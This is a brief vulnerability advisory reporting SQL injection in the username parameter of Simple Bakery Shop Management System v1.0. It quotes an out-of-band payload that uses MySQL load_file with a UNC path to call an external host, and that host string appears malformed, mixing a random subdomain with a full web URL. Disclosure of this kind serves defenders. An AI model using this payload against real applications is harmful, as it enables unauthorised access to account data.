## Description:
The username parameter from Simple Bakery Shop Management System v1.0 appears to be vulnerable to SQL injection attacks. 
The payload '+(select load_file('\\\\uecbuk5uwc33xkpj8ty1fdix5obhz9n0qoib8zx.https://www.sourcecodester.com/php/15174/simple-bakery-shop-management-system-phpoop-free-source-code.html\\zgr'))+' was submitted in the username parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can be retrieving all information about all
accounts of this system. The malicious actor can use this information for malicious purposes!
WARNING: If this is in some external domain, or some subdomain, or internal, this will be extremely dangerous!
Status: CRITICAL
